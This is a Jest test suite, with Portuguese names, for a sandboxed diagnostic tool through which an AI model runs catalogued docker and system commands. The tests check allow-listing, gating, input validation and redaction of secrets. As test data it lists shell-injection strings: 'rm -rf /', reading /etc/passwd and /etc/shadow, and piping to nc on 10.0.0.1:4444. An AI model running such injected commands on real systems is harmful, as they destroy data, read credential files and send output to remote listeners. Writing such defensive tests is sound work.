jest.mock('node:child_process');

import { spawn } from 'node:child_process';
import { OraculoConfig } from '../../config/config.service';
import {
  ConfiguracaoService,
  type ServicoResumido,
} from '../../config/configuracao.service';
import { RedactionService } from '../../security/redaction.service';
import { SanitizadorDiagnostico } from '../../security/sanitizador-diagnostico';
import { IDS_DO_CATALOGO } from './catalogo';
import { DiagnosticoCapacidade } from './diagnostico.capacidade';
import { ExecutorDiagnostico } from './executor.service';
import { criarProcessoFalso } from './processo-falso';

const spawnFalso = spawn as unknown as jest.Mock;

interface Cenario {
  estado?: boolean;
  ligadaNoBanco?: boolean;
  comandos?: string[];
  servicos?: string[];
  binario?: string | null;
}

function servico(nome: string, indice: number): ServicoResumido {
  return {
    id: `id-${indice}`,
    nome,
    rotulo: nome,
    ativo: true,
    criadoEm: new Date('2026-01-01T00:00:00.000Z'),
  };
}

function montar(cenario: Cenario = {}): DiagnosticoCapacidade {
  const config = {
    capacidades: {
      conhecimento: true,
      codigo: true,
      estado: cenario.estado ?? true,
      banco: false,
    },
    escopos: {
      repos: [],
      comandos: cenario.comandos ?? [...IDS_DO_CATALOGO],
      bancos: [],
    },
  } as unknown as OraculoConfig;

  const configuracao = {
    capacidadeLigada: () => cenario.ligadaNoBanco ?? true,
    servicosObservaveis: () =>
      Promise.resolve((cenario.servicos ?? ['oraculo-api']).map(servico)),
  } as unknown as ConfiguracaoService;

  const executor = new ExecutorDiagnostico(() =>
    cenario.binario === undefined ? '/usr/bin/docker' : cenario.binario,
  );

  return new DiagnosticoCapacidade(
    executor,
    new SanitizadorDiagnostico(new RedactionService()),
    config,
    configuracao,
  );
}

function responderComSaida(saida: string, codigo = 0): void {
  spawnFalso.mockImplementation(() => {
    const processo = criarProcessoFalso();

    setImmediate(() => {
      if (saida) {
        processo.stdout.emit('data', Buffer.from(saida));
      }

      processo.emit('close', codigo);
    });

    return processo;
  });
}

function chamadaDoSpawn(indice: number): unknown[] {
  return (spawnFalso.mock.calls as unknown[][])[indice];
}

function argumentosDoSpawn(indice = 0): string[] {
  return chamadaDoSpawn(indice)[1] as string[];
}

function tudoQueFoiParaOSpawn(): string {
  return JSON.stringify(spawnFalso.mock.calls);
}

describe('DiagnosticoCapacidade', () => {
  beforeEach(() => {
    spawnFalso.mockReset();
    responderComSaida('ok\n');
  });

  it('é sensível e vive sob a chave de env do estado', () => {
    const capacidade = montar();

    expect(capacidade.nome).toBe('estado_servicos');
    expect(capacidade.sensivel).toBe(true);
    expect(capacidade.chaveEnv).toBe('estado');
  });

  describe('catálogo fechado', () => {
    it('recusa id que não está no catálogo, sem nunca chamar spawn', async () => {
      const capacidade = montar();

      for (const comando of [
        'ls',
        'docker ps',
        'servicos_ativos; rm -rf /',
        'servicos_ativos && cat /etc/passwd',
        '$(whoami)',
        '__proto__',
        'constructor',
        '',
        '   ',
      ]) {
        const resultado = await capacidade.executar({ comando });

        expect(resultado.retornos).toEqual([]);
        expect(resultado.metrica).toContain('fora do catálogo');
      }

      expect(spawnFalso).not.toHaveBeenCalled();
    });

    it('recusa comando que não é texto', async () => {
      const capacidade = montar();

      for (const comando of [42, null, undefined, ['servicos_ativos'], {}]) {
        const resultado = await capacidade.executar({ comando });

        expect(resultado.volume).toBe(0);
      }

      expect(spawnFalso).not.toHaveBeenCalled();
    });

    it('não aceita argumento extra inventado pelo modelo', async () => {
      const capacidade = montar();

      await capacidade.executar({
        comando: 'servicos_ativos',
        argumentosExtras: ['--privileged'],
        binario: '/bin/sh',
        shell: true,
      });

      expect(argumentosDoSpawn()).toEqual([
        'ps',
        '--format',
        expect.stringContaining('{{.Names}}') as unknown as string,
      ]);
      expect(tudoQueFoiParaOSpawn()).not.toContain('--privileged');
      expect(tudoQueFoiParaOSpawn()).not.toContain('/bin/sh');
    });
  });

  describe('teto do ENV e recorte do banco', () => {
    it('recusa tudo quando CAP_ESTADO=off', async () => {
      const capacidade = montar({ estado: false });
      const resultado = await capacidade.executar({
        comando: 'servicos_ativos',
      });

      expect(resultado.metrica).toContain('CAP_ESTADO=off');
      expect(spawnFalso).not.toHaveBeenCalled();
    });

    it('recusa quando o banco desligou a capacidade, mesmo com o env ligado', async () => {
      const capacidade = montar({ ligadaNoBanco: false });
      const resultado = await capacidade.executar({
        comando: 'servicos_ativos',
      });

      expect(resultado.metrica).toContain('desligado na configuração');
      expect(spawnFalso).not.toHaveBeenCalled();
    });

    it('recusa id do catálogo que não está em ESTADO_COMANDOS', async () => {
      const capacidade = montar({ comandos: ['recursos_maquina'] });
      const resultado = await capacidade.executar({
        comando: 'servico_logs',
        servico: 'oraculo-api',
      });

      expect(resultado.metrica).toContain('ESTADO_COMANDOS');
      expect(spawnFalso).not.toHaveBeenCalled();
    });
  });

  describe('nome do serviço', () => {
    const injecoes = [
      'web; rm -rf /',
      'web && cat /etc/passwd',
      'web | nc 10.0.0.1 4444',
      '$(whoami)',
      '`whoami`',
      '--flag-malicioso',
      '-v/:/host',
      'web/../etc',
      '../etc/passwd',
      'web/outro',
      'web\ncat /etc/shadow',
      'oraculo-api web',
      'web > /tmp/saida',
    ];

    it('recusa toda tentativa de injeção e não deixa nada virar linha de comando', async () => {
      const capacidade = montar({ servicos: ['oraculo-api', 'web'] });

      for (const nomeMalicioso of injecoes) {
        const resultado = await capacidade.executar({
          comando: 'servico_logs',
          servico: nomeMalicioso,
        });

        expect(resultado.retornos).toEqual([]);
        expect(resultado.volume).toBe(0);
      }

      expect(spawnFalso).not.toHaveBeenCalled();

      const visto = tudoQueFoiParaOSpawn();

      for (const trecho of ['rm -rf', 'passwd', 'whoami', '--flag', '..']) {
        expect(visto).not.toContain(trecho);
      }
    });

    it('recusa serviço bem formado que não está cadastrado', async () => {
      const capacidade = montar({ servicos: ['oraculo-api'] });
      const resultado = await capacidade.executar({
        comando: 'servico_logs',
        servico: 'postgres',
      });

      expect(resultado.metrica).toContain('não está cadastrado');
      expect(spawnFalso).not.toHaveBeenCalled();
    });

    it('recusa serviço ausente ou vazio', async () => {
      const capacidade = montar();

      for (const servicoPedido of [undefined, '', '   ', 7, null]) {
        const resultado = await capacidade.executar({
          comando: 'estado_containers',
          servico: servicoPedido,
        });

        expect(resultado.volume).toBe(0);
      }

      expect(spawnFalso).not.toHaveBeenCalled();
    });

    it('recusa nome cadastrado no banco que esteja fora do formato aceito', async () => {
      const capacidade = montar({ servicos: ['web; rm -rf /'] });
      const resultado = await capacidade.executar({
        comando: 'servico_logs',
        servico: 'web; rm -rf /',
      });

      expect(resultado.volume).toBe(0);
      expect(spawnFalso).not.toHaveBeenCalled();
    });

    it('usa o nome vindo do banco, não a string crua do modelo', async () => {
      const capacidade = montar({ servicos: ['oraculo-api'] });

      await capacidade.executar({
        comando: 'servico_logs',
        servico: '  oraculo-api  ',
        linhas: 5,
      });

      expect(argumentosDoSpawn()).toEqual([
        'logs',
        '--timestamps',
        '--tail',
        '5',
        'oraculo-api',
      ]);
    });
  });

  describe('quantidade de linhas', () => {
    async function linhasQueChegaram(valor: unknown): Promise<string | null> {
      spawnFalso.mockClear();

      const capacidade = montar({ servicos: ['oraculo-api'] });
      const resultado = await capacidade.executar({
        comando: 'servico_logs',
        servico: 'oraculo-api',
        linhas: valor,
      });

      if (spawnFalso.mock.calls.length === 0) {
        expect(resultado.volume).toBe(0);

        return null;
      }

      const argumentos = argumentosDoSpawn();

      return argumentos[argumentos.indexOf('--tail') + 1];
    }

    it('clampa inteiro fora do intervalo antes de montar o comando', async () => {
      expect(await linhasQueChegaram(0)).toBe('1');
      expect(await linhasQueChegaram(-1)).toBe('1');
      expect(await linhasQueChegaram(999)).toBe('200');
      expect(await linhasQueChegaram(200)).toBe('200');
    });

    it('usa o padrão quando não vem', async () => {
      expect(await linhasQueChegaram(undefined)).toBe('100');
    });

    it('recusa valor que não é inteiro, sem chamar spawn', async () => {
      expect(await linhasQueChegaram('abc')).toBeNull();
      expect(await linhasQueChegaram('10; rm -rf /')).toBeNull();
      expect(await linhasQueChegaram(1.5)).toBeNull();
      expect(await linhasQueChegaram(true)).toBeNull();
      expect(await linhasQueChegaram({})).toBeNull();
    });

    it('o que chega no comando é sempre um inteiro dentro do intervalo', async () => {
      for (const candidato of [0, -1, 1, 50, 199, 200, 201, 999, '75']) {
        const chegou = await linhasQueChegaram(candidato);

        expect(chegou).not.toBeNull();

        const numero = Number(chegou);

        expect(Number.isInteger(numero)).toBe(true);
        expect(numero).toBeGreaterThanOrEqual(1);
        expect(numero).toBeLessThanOrEqual(200);
      }
    });
  });

  describe('sanitização da saída real', () => {
    it('nenhum IP sobrevive ao docker ps, mas porta, imagem e nome do serviço sim', async () => {
      responderComSaida(
        [
          'servico=oraculo-db\timagem=postgres:17-alpine\testado=Up 3 days\tde_pe_ha=3 days ago',
          'servico=oraculo-api\timagem=node:24-slim\testado=Up 2 hours\tde_pe_ha=2 hours ago',
          '0.0.0.0:5434->5432/tcp, :::5434->5432/tcp',
          'gateway 172.18.0.1, host srv-01.interno.example.com, mac 02:42:ac:11:00:02',
        ].join('\n'),
      );

      const capacidade = montar({ servicos: ['oraculo-db', 'oraculo-api'] });
      const resultado = await capacidade.executar({
        comando: 'servicos_ativos',
      });
      const conteudo = resultado.retornos[0].conteudo;

      expect(conteudo).not.toContain('0.0.0.0');
      expect(conteudo).not.toContain('172.18.0.1');
      expect(conteudo).not.toContain('srv-01.interno.example.com');
      expect(conteudo).not.toContain('02:42:ac:11:00:02');
      expect(conteudo).not.toMatch(/\b\d{1,3}(?:\.\d{1,3}){3}\b/);
      expect(conteudo).toContain('oraculo-db');
      expect(conteudo).toContain('oraculo-api');
      expect(conteudo).toContain('postgres:17-alpine');
      expect(conteudo).toContain('node:24-slim');
      expect(conteudo).toContain('[oculto:ip]:5434->5432/tcp');
      expect(conteudo).toContain('Up 3 days');
    });

    it('nenhum IP sobrevive ao ss -ltnp, mas porta e processo sim', async () => {
      responderComSaida(
        [
          'State   Recv-Q  Send-Q  Local Address:Port    Peer Address:Port  Process',
          'LISTEN  0       4096    127.0.0.1:5434         0.0.0.0:*          users:(("docker-proxy",pid=1234,fd=7))',
          'LISTEN  0       511     172.18.0.4:5432        0.0.0.0:*          users:(("postgres",pid=2222,fd=3))',
          'LISTEN  0       128     [::]:80                [::]:*             users:(("nginx",pid=5678,fd=6))',
        ].join('\n'),
      );

      const capacidade = montar({
        binario: '/usr/sbin/ss',
        servicos: ['docker-proxy', 'postgres', 'nginx'],
      });
      const resultado = await capacidade.executar({
        comando: 'portas_escutando',
      });
      const conteudo = resultado.retornos[0].conteudo;

      expect(conteudo).not.toContain('172.18.0.4');
      expect(conteudo).not.toMatch(/\[::\]/);
      expect(conteudo).toContain('127.0.0.1:5434');
      expect(conteudo).toContain('[oculto:ip]:5432');
      expect(conteudo).toContain('[oculto:ip]:80');
      expect(conteudo).toContain('docker-proxy');
      expect(conteudo).toContain('nginx');
      expect(conteudo).toContain('pid=1234');
    });

    it('mascara segredo que apareça no log do serviço', async () => {
      responderComSaida(
        [
          '2026-08-03T10:15:22.123Z conectando em postgres://oraculo:s3nh4-secreta@oraculo-db:5432/oraculo',
          '2026-08-03T10:15:23.000Z token Bearer abcdefghijklmnopqrstuvwx',
          '2026-08-03T10:15:24.000Z peer 10.0.0.5 caiu',
        ].join('\n'),
      );

      const capacidade = montar({ servicos: ['oraculo-api'] });
      const resultado = await capacidade.executar({
        comando: 'servico_logs',
        servico: 'oraculo-api',
      });
      const conteudo = resultado.retornos[0].conteudo;

      expect(conteudo).not.toContain('s3nh4-secreta');
      expect(conteudo).not.toContain('abcdefghijklmnopqrstuvwx');
      expect(conteudo).not.toContain('10.0.0.5');
      expect(conteudo).toContain('oraculo-db:5432');
      expect(conteudo).toContain('2026-08-03T10:15:22.123Z');
    });
  });

  describe('falhas de execução', () => {
    it('devolve erro legível quando o binário não existe, sem stack trace', async () => {
      const capacidade = montar({ binario: null });
      const resultado = await capacidade.executar({
        comando: 'servicos_ativos',
      });

      expect(spawnFalso).not.toHaveBeenCalled();
      expect(resultado.retornos[0].conteudo).toBe(
        'o binário "docker" não está disponível nesta máquina',
      );
      expect(resultado.metrica).toBe('servicos_ativos: 0 de 1 passo(s)');
    });

    it('marca truncado quando a saída passa do teto de bytes', async () => {
      spawnFalso.mockImplementation(() => {
        const processo = criarProcessoFalso();

        setImmediate(() => {
          processo.stdout.emit('data', Buffer.alloc(400_000, 0x61));
          processo.emit('close', null);
        });

        return processo;
      });

      const capacidade = montar({ servicos: ['oraculo-api'] });
      const resultado = await capacidade.executar({
        comando: 'servico_logs',
        servico: 'oraculo-api',
      });

      expect(resultado.retornos[0].truncado).toBe(true);
      expect(resultado.retornos[0].conteudo).toContain('saída cortada');
    });

    it('devolve erro tratado quando o comando estoura o tempo limite', async () => {
      spawnFalso.mockImplementation(() => {
        const processo = criarProcessoFalso();

        setImmediate(() => jest.advanceTimersByTime(11_000));

        return processo;
      });

      jest.useFakeTimers({ doNotFake: ['setImmediate'] });

      try {
        const capacidade = montar({ servicos: ['oraculo-api'] });
        const resultado = await capacidade.executar({
          comando: 'servico_logs',
          servico: 'oraculo-api',
        });

        expect(resultado.retornos[0].conteudo).toContain('tempo limite');
      } finally {
        jest.useRealTimers();
      }
    });

    it('roda os quatro passos de recursos_maquina de forma independente', async () => {
      const capacidade = montar({ binario: '/usr/bin/uptime' });
      const resultado = await capacidade.executar({
        comando: 'recursos_maquina',
      });

      expect(spawnFalso).toHaveBeenCalledTimes(4);
      expect(resultado.retornos).toHaveLength(4);
      expect(resultado.metrica).toBe('recursos_maquina: 4 de 4 passo(s)');
      expect(resultado.plano?.split('\n')).toEqual([
        'uptime',
        'free -m',
        'df -h',
        'nproc',
      ]);
    });
  });

  describe('catálogo legível para auditoria', () => {
    it('lista id, descrição e a linha de comando exata de cada entrada', () => {
      const capacidade = montar({ comandos: ['servicos_ativos'] });
      const exibido = capacidade.catalogoParaAuditoria();

      expect(exibido.ferramenta).toBe('estado_servicos');
      expect(exibido.tetoDoEnv).toBe(true);
      expect(exibido.ligada).toBe(true);
      expect(exibido.liberadosNoEnv).toEqual(['servicos_ativos']);
      expect(exibido.entradas.map((entrada) => entrada.id)).toEqual([
        ...IDS_DO_CATALOGO,
      ]);

      const logs = exibido.entradas.find(
        (entrada) => entrada.id === 'servico_logs',
      );

      expect(logs?.liberadaNoEnv).toBe(false);
      expect(logs?.comandos).toEqual([
        'docker logs --timestamps --tail <linhas> <servico>',
      ]);
      expect(logs?.argumentos).toEqual([
        {
          nome: 'servico',
          tipo: 'servico_observavel',
          obrigatorio: true,
          descricao: expect.any(String) as unknown as string,
          minimo: null,
          maximo: null,
          padrao: null,
        },
        {
          nome: 'linhas',
          tipo: 'inteiro',
          obrigatorio: false,
          descricao: expect.any(String) as unknown as string,
          minimo: 1,
          maximo: 200,
          padrao: 100,
        },
      ]);
    });

    it('mostra desligado quando o env fecha a capacidade', () => {
      const exibido = montar({ estado: false }).catalogoParaAuditoria();

      expect(exibido.tetoDoEnv).toBe(false);
      expect(exibido.ligada).toBe(false);
    });

    it('mostra desligado quando só o banco fecha a capacidade', () => {
      const exibido = montar({ ligadaNoBanco: false }).catalogoParaAuditoria();

      expect(exibido.tetoDoEnv).toBe(true);
      expect(exibido.ligada).toBe(false);
    });
  });
});
